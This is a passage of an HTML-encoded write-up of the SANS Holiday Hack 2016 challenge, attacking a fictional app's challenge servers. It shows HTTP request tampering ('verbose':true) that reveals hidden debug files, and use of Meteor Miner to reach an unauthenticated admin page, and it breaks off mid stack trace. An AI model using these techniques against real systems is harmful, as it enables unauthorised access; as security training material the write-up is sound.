&lt;p&gt;&lt;em&gt;&amp;lt;/reminder&amp;gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;We can now launch the application, log in with our credentials
&lt;code&gt;guest/busyreindeer78&lt;/code&gt;, and edit our profile:&lt;/p&gt;
&lt;img alt="dev_edit_profile.png" class="align-center" src="/images/sans-christmas-challenge-2016/dev_edit_profile.png" /&gt;
&lt;p&gt;Our patch worked, because we can see some request to the debug server:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/index.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;dev.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;144&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;20161227010602+0100&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;udid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;58bc60a3ff0f2f1a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;com.northpolewonderland.santagram.EditProfile, EditProfile&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;freemem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;26914200&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.6.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Tue, 27 Dec 2016 00:06:03 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;250&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;20161227000603&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;OK&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;filename&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161227000603-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;request&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;20161227010602+0100&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;udid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;58bc60a3ff0f2f1a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;com.northpolewonderland.santagram.EditProfile, EditProfile&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;freemem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;26914200&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;verbose&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see in the server's reponse that there's a &lt;code&gt;verbose&lt;/code&gt; parameter
set to &lt;code&gt;false&lt;/code&gt;. What if we set &lt;code&gt;&amp;quot;verbose&amp;quot;:true&lt;/code&gt; in our request
(me loves some verbosity)?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/index.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;dev.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;159&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;20161227001619+0100&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;udid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;58bc60a3ff0f2f1a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;com.northpolewonderland.santagram.EditProfile, EditProfile&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;freemem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;48663448&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;verbose&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.6.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Tue, 27 Dec 2016 00:09:10 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;755&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;20161227000910&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;date.len&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;OK&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;status.len&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;filename&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161227000910-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;filename.len&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;26&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;request&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;20161227001619+0100&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;udid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;58bc60a3ff0f2f1a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;com.northpolewonderland.santagram.EditProfile, EditProfile&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;freemem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;48663448&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;verbose&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;files&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161224235959-0.mp3&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161226231736-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161226232005-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161226232057-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161226232243-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161226232507-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161226232516-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161226233655-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161226234235-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161226234246-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161226234259-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161226234313-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161227000501-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161227000603-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug-20161227000910-0.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Yes! Many more informations were sent back, including the name of our audio
file, &lt;code&gt;debug-20161224235959-0.mp3&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We can now download our audio file at this URL: &lt;a class="reference external" href="http://dev.northpolewonderland.com/debug-20161224235959-0.mp3"&gt;http://dev.northpolewonderland.com/debug-20161224235959-0.mp3&lt;/a&gt;&lt;/p&gt;
&lt;img alt="dev_audio_file.png" class="align-center" src="/images/sans-christmas-challenge-2016/dev_audio_file.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="the-banner-ad-server"&gt;
&lt;h3&gt;&lt;a class="reference external" href="http://ads.northpolewonderland.com/"&gt;The Banner Ad Server&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;The SantaGram bug bounty program is apparently running an ad server, so as to
display ad in the Android application. If we go to this ad web server, we can
see that it's running the &lt;a class="reference external" href="https://www.meteor.com/"&gt;Meteor Javascript framework&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class="hll"&gt;  &lt;span class="nt"&gt;&amp;lt;link&lt;/span&gt; &lt;span class="na"&gt;rel=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;stylesheet&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text/css&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;__meteor-css__&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/d1281f37fbafb6db67a052e58c901679c5cabcc2.css?meteor_css_resource=true&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;charset=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;http-equiv=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;X-UA-Compatible&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;IE=edge&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;viewport&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;width=device-width, initial-scale=1&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;lt;!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags--&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;description&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Holiday Hack&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;Ad Nauseam - Stupid Ads for Stupid People&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;

&lt;span class="hll"&gt;&lt;span class="nt"&gt;&amp;lt;script &lt;/span&gt;&lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text/javascript&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;__meteor_runtime_config__&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;JSON&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;parse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;decodeURIComponent&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;%7B%22meteorRelease%22%3A%22METEOR%401.4.2.3%22%2C%22meteorEnv%22%3A%7B%22NODE_ENV%22%3A%22production%22%2C%22TEST_METADATA%22%3A%22%7B%7D%22%7D%2C%22PUBLIC_SETTINGS%22%3A%7B%7D%2C%22ROOT_URL%22%3A%22http%3A%2F%2Fads.northpolewonderland.com%22%2C%22ROOT_URL_PATH_PREFIX%22%3A%22%22%2C%22appId%22%3A%221vgh1e61x7h692h4hyt1%22%2C%22autoupdateVersion%22%3A%22537dcf6b4594db16ea2d99d0a920f2deeb7dc9f1%22%2C%22autoupdateVersionRefreshable%22%3A%2205c3f7dba9f3e15efa3d971acf18cab901dc0505%22%2C%22autoupdateVersionCordova%22%3A%22none%22%7D&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/span&gt;
&lt;span class="hll"&gt;  &lt;span class="nt"&gt;&amp;lt;script &lt;/span&gt;&lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text/javascript&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/fedc8e9f69dab9d81a4f227d6ec76567fcb56231.js?meteor_js_resource=true&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;What a crazy random happenstance, it just so happens that &lt;a class="reference external" href="https://pen-testing.sans.org/blog/2016/12/06/mining-meteor"&gt;an article&lt;/a&gt;
about pentesting Meteor-based web applications was recently published on the
SANS blog.&lt;/p&gt;
&lt;p&gt;So, let's spin &lt;a class="reference external" href="https://tampermonkey.net/"&gt;Tampermonkey&lt;/a&gt;, with the &lt;a class="reference external" href="https://github.com/nidem/MeteorMiner/"&gt;Meteor
Miner&lt;/a&gt; script, to see what kind of
informations we can extract from the applications. On this screenshot, we can
see that we have access to the quotes printed on the front page:&lt;/p&gt;
&lt;img alt="ads_meteor_miner_front.png" class="align-center" src="/images/sans-christmas-challenge-2016/ads_meteor_miner_front.png" /&gt;
&lt;p&gt;We can also see that there's an &lt;a class="reference external" href="http://ads.northpolewonderland.com/admin/quotes"&gt;/admin/quotes&lt;/a&gt;
page:&lt;/p&gt;
&lt;img alt="ads_meteor_miner_admin_route.png" class="align-center" src="/images/sans-christmas-challenge-2016/ads_meteor_miner_admin_route.png" /&gt;
&lt;p&gt;If we go to it, even if we're supposed to be logged in, we can see that
there's one quote more than on the front page:&lt;/p&gt;
&lt;img alt="ads_meteor_miner_admin_page.png" class="align-center" src="/images/sans-christmas-challenge-2016/ads_meteor_miner_admin_page.png" /&gt;
&lt;p&gt;In one of these quotes, we can see that there's a link to the MP3 file we want.
We can then download the MP3 file from this URL: &lt;a class="reference external" href="http://ads.northpolewonderland.com/ofdAR4UYRaeNxMg/discombobulatedaudio5.mp3"&gt;http://ads.northpolewonderland.com/ofdAR4UYRaeNxMg/discombobulatedaudio5.mp3&lt;/a&gt;&lt;/p&gt;
&lt;img alt="ads_result.png" class="align-center" src="/images/sans-christmas-challenge-2016/ads_result.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="the-uncaught-exception-handler-server"&gt;
&lt;h3&gt;&lt;a class="reference external" href="http://ex.northpolewonderland.com/exception.php"&gt;The Uncaught Exception Handler Server&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;When the Android application encounters a Java exception, it's sent to an
exception handling server: &lt;a class="reference external" href="http://ex.northpolewonderland.com/exception.php"&gt;http://ex.northpolewonderland.com/exception.php&lt;/a&gt;.
For example, when I first tried to run the Santagram application on a virtual
Android device, this exception was sent (some problem with the resolution of
my virtual device):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/exception.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;3860&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;operation&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;WriteCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Canvas: trying to draw too large(113246208bytes) bitmap.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;lmessage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Canvas: trying to draw too large(113246208bytes) bitmap.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;strace&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;java.lang.RuntimeException: Canvas: trying to draw too large(113246208bytes) bitmap.\n\tat android.view.DisplayListCanvas.throwIfCannotDraw(DisplayListCanvas.java:260)\n\tat android.graphics.Canvas.drawBitmap(Canvas.java:1415)\n\tat android.graphics.drawable.BitmapDrawable.draw(BitmapDrawable.java:528)\n\tat android.widget.ImageView.onDraw(ImageView.java:1316)\n\tat android.view.View.draw(View.java:17185)\n\tat android.view.View.updateDisplayListIfDirty(View.java:16167)\n\tat android.view.View.draw(View.java:16951)\n\tat android.view.ViewGroup.drawChild(ViewGroup.java:3727)\n\tat android.view.ViewGroup.dispatchDraw(ViewGroup.java:3513)\n\tat android.view.View.updateDisplayListIfDirty(View.java:16162)\n\tat android.view.View.draw(View.java:16951)\n\tat android.view.ViewGroup.drawChild(ViewGroup.java:3727)\n\tat android.view.ViewGroup.dispatchDraw(ViewGroup.java:3513)\n\tat android.view.View.updateDisplayListIfDirty(View.java:16162)\n\tat android.view.View.draw(View.java:16951)\n\tat android.view.ViewGroup.drawChild(ViewGroup.java:3727)\n\tat android.view.ViewGroup.dispatchDraw(ViewGroup.java:3513)\n\tat android.view.View.updateDisplayListIfDirty(View.java:16162)\n\tat android.view.View.draw(View.java:16951)\n\tat android.view.ViewGroup.drawChild(ViewGroup.java:3727)\n\tat android.view.ViewGroup.dispatchDraw(ViewGroup.java:3513)\n\tat android.view.View.updateDisplayListIfDirty(View.java:16162)\n\tat android.view.View.draw(View.java:16951)\n\tat android.view.ViewGroup.drawChild(ViewGroup.java:3727)\n\tat android.view.ViewGroup.dispatchDraw(ViewGroup.java:3513)\n\tat android.view.View.updateDisplayListIfDirty(View.java:16162)\n\tat android.view.View.draw(View.java:16951)\n\tat android.view.ViewGroup.drawChild(ViewGroup.java:3727)\n\tat android.view.ViewGroup.dispatchDraw(ViewGroup.java:3513)\n\tat android.view.View.draw(View.java:17188)\n\tat com.android.internal.policy.DecorView.draw(DecorView.java:753)\n\tat android.view.View.updateDisplayListIfDirty(View.java:16167)\n\tat android.view.ThreadedRenderer.updateViewTreeDisplayList(ThreadedRenderer.java:648)\n\tat android.view.ThreadedRenderer.updateRootDisplayList(ThreadedRenderer.java:654)\n\tat android.view.ThreadedRenderer.draw(ThreadedRenderer.java:762)\n\tat android.view.ViewRootImpl.draw(ViewRootImpl.java:2800)\n\tat android.view.ViewRootImpl.performDraw(ViewRootImpl.java:2608)\n\tat android.view.ViewRootImpl.performTraversals(ViewRootImpl.java:2215)\n\tat 